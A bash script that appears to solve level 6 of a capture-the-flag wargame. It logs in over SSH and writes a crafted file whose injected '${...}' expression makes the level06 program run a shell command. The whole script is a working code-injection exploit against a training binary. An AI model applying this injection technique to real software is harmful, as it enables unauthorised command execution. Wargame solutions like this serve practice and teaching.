#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

sshexec.sh "$host" "$port" level06 "$pass" 'set -e; echo "[x {\$z(\`echo getflag\`)}]" > /tmp/level06; ./level06 /tmp/level06 system | grep "Check flag\."'
